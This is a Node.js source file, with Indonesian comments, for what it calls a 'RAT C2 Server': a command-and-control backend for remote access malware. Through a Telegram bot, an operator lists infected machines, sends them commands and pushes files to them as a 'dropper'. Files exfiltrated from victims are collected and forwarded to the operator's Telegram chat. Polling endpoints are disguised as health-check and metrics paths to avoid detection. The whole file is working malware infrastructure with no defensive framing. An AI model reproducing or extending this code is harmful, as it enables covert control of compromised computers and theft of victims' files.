const express = require('express');
const axios = require('axios');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const app = express();

// --- KONFIGURASI ---
const PORT = process.env.PORT || 3000;
const BOT_TOKEN = process.env.BOT_TOKEN_B || 'your_telegram_bot_token_here';
const CHAT_ID = process.env.CHAT_ID || 'your_chat_id_here';

// --- HAPUS VALIDASI CRASH ---
// Hanya warning, tidak exit
if (!BOT_TOKEN || !CHAT_ID) {
    console.warn("⚠️  WARNING: Telegram credentials not set. Running in debug mode.");
}

// --- MIDDLEWARE DENGAN LIMIT BESAR ---
app.use(express.json({ limit: '5000mb' }));
app.use(express.urlencoded({ limit: '5000mb', extended: true }));

// --- DATABASE SEMENTARA (MEMORY) ---
let onlineBots = {}; 
let currentTarget = "ALL"; 
let commandData = {
    id: 0,      
    cmd: "",    
    payload: "" 
};

// Direktori untuk file sementara
const TEMP_DIR = './temp_uploads';
if (!fs.existsSync(TEMP_DIR)) {
    fs.mkdirSync(TEMP_DIR, { recursive: true });
}

// --- FUNGSI BANTUAN KIRIM PESAN ---
async function sendTelegram(text, options = {}) {
    try {
        const payload = {
            chat_id: CHAT_ID,
            text: text,
            parse_mode: 'Markdown',
            ...options
        };
        
        await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, payload, {
            timeout: 10000
        });
    } catch (e) { 
        console.error("TG Send Error:", e.message);
    }
}

// --- FUNGSI CLEANUP TEMP FILES ---
function cleanupTempFiles() {
    try {
        const files = fs.readdirSync(TEMP_DIR);
        const now = Date.now();
        
        files.forEach(file => {
            const filePath = path.join(TEMP_DIR, file);
            const stats = fs.statSync(filePath);
            
            // Hapus file yang lebih dari 1 jam
            if (now - stats.mtimeMs > 3600000) {
                fs.unlinkSync(filePath);
                console.log(`Cleaned up temp file: ${file}`);
            }
        });
    } catch (e) {
        console.error("Cleanup error:", e.message);
    }
}

// --- LOGIKA UTAMA: CEK UPDATE DARI TELEGRAM ---
let lastUpdateId = 0;
async function checkTelegramUpdates() {
    try {
        const url = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}&timeout=30`;
        const resp = await axios.get(url, { timeout: 35000 });
        const updates = resp.data.result;

        if (updates.length > 0) {
            for (const update of updates) {
                lastUpdateId = update.update_id;
                const message = update.message || update.edited_message;
                if (!message) continue;

                const chatId = message.chat.id;
                
                // Cek apakah chat ID sesuai dengan admin
                if (chatId.toString() !== CHAT_ID && !CHAT_ID.includes(chatId.toString())) {
                    console.log(`Ignoring message from unauthorized chat: ${chatId}`);
                    continue;
                }

                // A. JIKA ADMIN KIRIM TEKS
                if (message.text) {
                    const text = message.text.trim();

                    if (text === '/start' || text === '/help') {
                        const helpText = `🤖 **RAT C2 Control Panel**\n\n` +
                                       `**Commands:**\n` +
                                       `/bots - List online bots\n` +
                                       `/target [ID|ALL] - Set target bot\n` +
                                       `/cmd [command] - Send command\n` +
                                       `/status - Check server status\n` +
                                       `/clear - Clear command queue\n\n` +
                                       `**Current Target:** \`${currentTarget}\``;
                        await sendTelegram(helpText);
                    }
                    else if (text === '/bots') {
                        let list = "🤖 **ONLINE BOTS (Last 30s):**\n";
                        let count = 0;
                        const now = Date.now();
                        
                        for (const [id, time] of Object.entries(onlineBots)) {
                            if (now - time < 30000) { 
                                list += `- \`${id}\`\n`;
                                count++;
                            }
                        }
                        
                        if (count === 0) list += "(No bots active)";
                        list += `\n🎯 **Target:** \`${currentTarget}\``;
                        list += `\n📊 **Total:** ${count} bot(s) online`;
                        
                        await sendTelegram(list);
                    }
                    else if (text.startsWith('/target ')) {
                        const newTarget = text.replace('/target ', '').trim();
                        currentTarget = newTarget;
                        
                        if (newTarget === 'ALL') {
                            await sendTelegram(`🎯 Target set to: **ALL BOTS**`);
                        } else {
                            await sendTelegram(`🎯 Target set to: \`${newTarget}\``);
                        }
                    }
                    else if (text.startsWith('/cmd ')) {
                        const cmd = text.replace('/cmd ', '').trim();
                        
                        if (!cmd) {
                            await sendTelegram("❌ Please provide a command");
                            return;
                        }
                        
                        commandData = {
                            id: Date.now(),
                            cmd: cmd,
                            payload: "",
                            timestamp: new Date().toISOString(),
                            sender: chatId
                        };
                        
                        const targetText = currentTarget === 'ALL' ? 'ALL BOTS' : `\`${currentTarget}\``;
                        await sendTelegram(`🚀 **Command Sent**\n` +
                                         `**Target:** ${targetText}\n` +
                                         `**Command:** \`${cmd}\`\n` +
                                         `**ID:** \`${commandData.id}\``);
                    }
                    else if (text === '/status') {
                        const botCount = Object.keys(onlineBots).length;
                        const activeBots = Object.entries(onlineBots)
                            .filter(([_, time]) => Date.now() - time < 30000)
                            .length;
                        
                        const statusText = `📊 **Server Status**\n\n` +
                                         `**Online Bots:** ${activeBots}\n` +
                                         `**Total Registered:** ${botCount}\n` +
                                         `**Current Target:** \`${currentTarget}\`\n` +
                                         `**Last Command ID:** ${commandData.id || 'None'}\n` +
                                         `**Server Time:** ${new Date().toLocaleString()}`;
                        
                        await sendTelegram(statusText);
                    }
                    else if (text === '/clear') {
                        commandData = { id: 0, cmd: "", payload: "" };
                        await sendTelegram("✅ Command queue cleared");
                    }
                }

                // B. JIKA ADMIN KIRIM FILE (REVERSE DROPPER)
                else if (message.document) {
                    const fileId = message.document.file_id;
                    const fileName = message.document.file_name || `file_${Date.now()}.bin`;
                    
                    await sendTelegram(`⏳ **Receiving payload:** \`${fileName}\`...`);

                    try {
                        // Get file info
                        const fileInfo = await axios.get(
                            `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${fileId}`,
                            { timeout: 10000 }
                        );
                        
                        const filePath = fileInfo.data.result.file_path;
                        const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;

                        // Download file
                        const response = await axios.get(downloadUrl, { 
                            responseType: 'arraybuffer',
                            timeout: 30000,
                            maxContentLength: Infinity
                        });
                        
                        // Encode to base64
                        const base64Str = Buffer.from(response.data).toString('base64');
                        
                        // Save temp file (optional)
                        const tempFilePath = path.join(TEMP_DIR, `${Date.now()}_${fileName}`);
                        fs.writeFileSync(tempFilePath, response.data);
                        
                        commandData = {
                            id: Date.now(),
                            cmd: `save ${fileName}`,
                            payload: base64Str,
                            fileSize: response.data.length,
                            timestamp: new Date().toISOString()
                        };
                        
                        const fileSizeMB = (response.data.length / (1024 * 1024)).toFixed(2);
                        const targetText = currentTarget === 'ALL' ? 'ALL BOTS' : `\`${currentTarget}\``;
                        
                        await sendTelegram(`☢️ **DROPPER ACTIVE**\n\n` +
                                         `**File:** \`${fileName}\`\n` +
                                         `**Size:** ${fileSizeMB} MB\n` +
                                         `**Target:** ${targetText}\n` +
                                         `**Command ID:** \`${commandData.id}\``);
                        
                    } catch (downloadError) {
                        console.error("Download error:", downloadError.message);
                        await sendTelegram(`❌ Failed to download file: ${downloadError.message}`);
                    }
                }
                
                // C. JIKA ADMIN KIRIM FOTO
                else if (message.photo) {
                    const photos = message.photo;
                    const largestPhoto = photos[photos.length - 1]; // Get highest resolution
                    
                    await sendTelegram(`📸 **Receiving photo**...`);
                    
                    try {
                        const fileInfo = await axios.get(
                            `https://api.telegram.org/bot${BOT_TOKEN}/getFile?file_id=${largestPhoto.file_id}`,
                            { timeout: 10000 }
                        );
                        
                        const filePath = fileInfo.data.result.file_path;
                        const downloadUrl = `https://api.telegram.org/file/bot${BOT_TOKEN}/${filePath}`;
                        
                        const response = await axios.get(downloadUrl, { 
                            responseType: 'arraybuffer',
                            timeout: 30000
                        });
                        
                        const base64Str = Buffer.from(response.data).toString('base64');
                        const fileName = `photo_${Date.now()}.jpg`;
                        
                        commandData = {
                            id: Date.now(),
                            cmd: `save ${fileName}`,
                            payload: base64Str,
                            fileSize: response.data.length,
                            timestamp: new Date().toISOString()
                        };
                        
                        const fileSizeKB = (response.data.length / 1024).toFixed(2);
                        const targetText = currentTarget === 'ALL' ? 'ALL BOTS' : `\`${currentTarget}\``;
                        
                        await sendTelegram(`🖼️ **Photo Dropper**\n\n` +
                                         `**File:** \`${fileName}\`\n` +
                                         `**Size:** ${fileSizeKB} KB\n` +
                                         `**Target:** ${targetText}\n` +
                                         `**ID:** \`${commandData.id}\``);
                        
                    } catch (error) {
                        console.error("Photo error:", error.message);
                        await sendTelegram(`❌ Failed to process photo: ${error.message}`);
                    }
                }
            }
        }
    } catch (e) { 
        console.error("Telegram Update Error:", e.message);
    }
}

// --- PERIODIC CLEANUP ---
setInterval(() => {
    // Clean old bots (more than 5 minutes)
    const now = Date.now();
    let cleaned = 0;
    
    for (const [botId, lastSeen] of Object.entries(onlineBots)) {
        if (now - lastSeen > 300000) { // 5 minutes
            delete onlineBots[botId];
            cleaned++;
        }
    }
    
    if (cleaned > 0) {
        console.log(`Cleaned ${cleaned} inactive bots`);
    }
    
    // Clean temp files
    cleanupTempFiles();
    
}, 60000); // Every minute

// ============================================
// ENDPOINT UTAMA
// ============================================

// Helper function untuk handle polling
async function handlePollRequest(req, res) {
    try {
        const { bot_id } = req.body;
        
        if (bot_id && typeof bot_id === 'string') {
            onlineBots[bot_id] = Date.now();
            console.log(`Bot checked in: ${bot_id}`);
        }

        // Check for new Telegram commands
        await checkTelegramUpdates();

        // Determine if this bot is the target
        const isTarget = (currentTarget === "ALL" || currentTarget === bot_id);
        
        if (isTarget && commandData.cmd !== "") {
            return res.json({
                status: "command",
                id: commandData.id,
                cmd: commandData.cmd,
                payload: commandData.cmd.startsWith("save ") ? commandData.payload : "",
                timestamp: commandData.timestamp || new Date().toISOString()
            });
        }
        
        return res.json({ 
            status: "idle",
            message: "No commands",
            server_time: new Date().toISOString()
        });

    } catch (e) { 
        console.error("Poll error:", e.message);
        res.status(500).json({ 
            status: "error", 
            message: "Internal server error" 
        });
    }
}

// Helper function untuk handle report
async function handleReportRequest(req, res) {
    try {
        const { id, aes, chacha } = req.body;

        if (!id) {
            return res.status(400).json({ status: 'error', message: 'Missing bot ID' });
        }

        // Update bot online status
        onlineBots[id] = Date.now();

        // A. JIKA RAT MENGIRIM FILE (EXFILTRATION)
        if (chacha && chacha.startsWith("upload ")) {
            const filename = chacha.replace("upload ", "").trim();
            console.log(`[EXFIL] Receiving file: ${filename} from ${id}`);
            
            if (!aes) {
                return res.status(400).json({ status: 'error', message: 'No file data' });
            }

            try {
                // Decode base64
                const fileBuffer = Buffer.from(aes, 'base64');
                
                // Save to temp file first
                const tempFilePath = path.join(TEMP_DIR, `${Date.now()}_${filename}`);
                fs.writeFileSync(tempFilePath, fileBuffer);
                
                // Send to Telegram
                const form = new FormData();
                form.append('chat_id', CHAT_ID);
                form.append('document', fs.createReadStream(tempFilePath), { filename: filename });
                form.append('caption', `📂 **Exfiltrated File**\n**From:** \`${id}\`\n**File:** \`${filename}\`\n**Size:** ${(fileBuffer.length / 1024).toFixed(2)} KB`);
                
                const telegramResponse = await axios.post(
                    `https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`,
                    form,
                    {
                        headers: form.getHeaders(),
                        maxContentLength: Infinity,
                        maxBodyLength: Infinity,
                        timeout: 60000
                    }
                );
                
                console.log(`File sent to Telegram: ${filename}`);
                
                // Clean up temp file
                fs.unlinkSync(tempFilePath);
                
                return res.json({ 
                    status: 'success', 
                    message: 'File uploaded successfully',
                    file_size: fileBuffer.length
                });
                
            } catch (fileError) {
                console.error("File upload error:", fileError.message);
                return res.status(500).json({ 
                    status: 'error', 
                    message: 'Failed to upload file' 
                });
            }
        } 
        // B. JIKA RAT LAPOR TEKS BIASA
        else if (aes && chacha) {
            console.log(`[REPORT] From ${id}: ${chacha.substring(0, 50)}...`);
            
            // Truncate long messages for Telegram (max 4096 chars)
            const truncatedAes = aes.length > 3000 ? aes.substring(0, 3000) + "\n...[TRUNCATED]" : aes;
            
            const msg = `💻 **Report from \`${id}\`**\n\n` +
                       `**Command:** \`${chacha}\`\n\n` +
                       `**Output:**\n\`\`\`\n${truncatedAes}\n\`\`\``;
            
            await sendTelegram(msg, { disable_web_page_preview: true });
            
            return res.json({ 
                status: 'success', 
                message: 'Report received' 
            });
        } 
        else {
            return res.status(400).json({ 
                status: 'error', 
                message: 'Invalid report format' 
            });
        }
        
    } catch (e) { 
        console.error("Report Error:", e.message);
        res.status(500).json({ 
            status: 'error', 
            message: e.message 
        }); 
    }
}

// ============================================
// ENDPOINT DEFINITIONS
// ============================================

// --- ENDPOINT 1: POLLING (original) ---
app.post('/poll', handlePollRequest);

// --- ENDPOINT 2: REPORT (original) ---
app.post('/report', handleReportRequest);

// ============================================
// ENDPOINT ALIAS UNTUK CLOUDFLARE WORKER
// ============================================

// --- ENDPOINT 3: /internal/beacon (alias untuk /poll) ---
app.post('/internal/beacon', handlePollRequest);

// --- ENDPOINT 4: /internal/report (alias untuk /report) ---
app.post('/internal/report', handleReportRequest);

// --- ENDPOINT 5: /api/v1/health (time-based alias) ---
app.post('/api/v1/health', handlePollRequest);
app.post('/api/v2/metrics', handlePollRequest);
app.post('/api/v3/status', handlePollRequest);
app.post('/api/v4/ping', handlePollRequest);

// --- ENDPOINT 6: /b3a5c7 (obfuscated path untuk /poll) ---
app.post('/b3a5c7', handlePollRequest);

// --- ENDPOINT 7: /d8e2f9 (obfuscated path untuk /report) ---
app.post('/d8e2f9', handleReportRequest);

// --- ENDPOINT 8: /api/health (API-looking path) ---
app.post('/api/health', handlePollRequest);

// --- ENDPOINT 9: /metrics/collect (metrics-looking path) ---
app.post('/metrics/collect', handleReportRequest);

// ============================================
// UTILITY ENDPOINTS
// ============================================

// --- HEALTH CHECK ENDPOINT ---
app.get('/health', (req, res) => {
    const activeBots = Object.entries(onlineBots)
        .filter(([_, time]) => Date.now() - time < 30000)
        .length;
    
    res.json({
        status: 'ok',
        server_time: new Date().toISOString(),
        active_bots: activeBots,
        total_bots: Object.keys(onlineBots).length,
        current_target: currentTarget,
        command_queue: commandData.cmd ? 1 : 0,
        uptime: process.uptime(),
        endpoints: [
            '/poll', '/report',
            '/internal/beacon', '/internal/report',
            '/api/v1/health', '/b3a5c7', '/d8e2f9'
        ]
    });
});

// --- DEBUG ENDPOINT (untuk cek environment) ---
app.get('/debug-env', (req, res) => {
    const maskedToken = BOT_TOKEN && BOT_TOKEN !== 'your_telegram_bot_token_here' 
        ? BOT_TOKEN.substring(0, 10) + '...' 
        : 'NOT SET OR DEFAULT';
    
    res.json({
        bot_token_set: !!BOT_TOKEN && BOT_TOKEN !== 'your_telegram_bot_token_here',
        bot_token_preview: maskedToken,
        chat_id_set: !!CHAT_ID && CHAT_ID !== 'your_chat_id_here',
        chat_id: CHAT_ID && CHAT_ID !== 'your_chat_id_here' ? '***' + CHAT_ID.slice(-3) : 'NOT SET OR DEFAULT',
        port: PORT,
        node_env: process.env.NODE_ENV || 'development',
        timestamp: new Date().toISOString(),
        online_bots_count: Object.keys(onlineBots).length
    });
});

// --- CLEAR COMMAND ENDPOINT (for debugging) ---
app.post('/clear', (req, res) => {
    commandData = { id: 0, cmd: "", payload: "" };
    res.json({ status: 'success', message: 'Command cleared' });
});

// --- ROOT ENDPOINT ---
app.get('/', (req, res) => {
    res.json({
        service: 'RAT C2 Server',
        version: '2.0',
        status: 'operational',
        endpoints: {
            polling: ['/poll', '/internal/beacon', '/b3a5c7', '/api/health'],
            reporting: ['/report', '/internal/report', '/d8e2f9', '/metrics/collect'],
            utility: ['/health', '/debug-env', '/clear']
        },
        documentation: 'Use POST requests with JSON payload'
    });
});

// --- ERROR HANDLING MIDDLEWARE ---
app.use((err, req, res, next) => {
    console.error('Server Error:', err.stack);
    res.status(500).json({ 
        status: 'error', 
        message: 'Something went wrong!',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// --- 404 HANDLER ---
app.use((req, res) => {
    res.status(404).json({
        status: 'error',
        message: `Endpoint ${req.method} ${req.path} not found`,
        available_endpoints: {
            GET: ['/', '/health', '/debug-env'],
            POST: ['/poll', '/report', '/internal/beacon', '/internal/report']
        }
    });
});

// --- START SERVER ---
app.listen(PORT, () => {
    console.log(`
    ╔══════════════════════════════════════╗
    ║        RAT C2 SERVER RUNNING         ║
    ╠══════════════════════════════════════╣
    ║ Port: ${PORT}${' '.repeat(33 - PORT.toString().length)}║
    ║ Env:  ${process.env.NODE_ENV || 'development'}${' '.repeat(33 - (process.env.NODE_ENV || 'development').length)}║
    ║ Time: ${new Date().toLocaleString()}${' '.repeat(14)}║
    ║                                      ║
    ║ 📡 Endpoints Ready:                  ║
    ║   • /poll → /internal/beacon         ║
    ║   • /report → /internal/report       ║
    ║   • /health (status check)           ║
    ╚══════════════════════════════════════╝
    `);
    
    // Initial cleanup
    cleanupTempFiles();
    
    // Log environment status
    if (!BOT_TOKEN || BOT_TOKEN === 'your_telegram_bot_token_here') {
        console.warn('⚠️  WARNING: BOT_TOKEN_B not set or using default value');
    }
    if (!CHAT_ID || CHAT_ID === 'your_chat_id_here') {
        console.warn('⚠️  WARNING: CHAT_ID not set or using default value');
    }
});
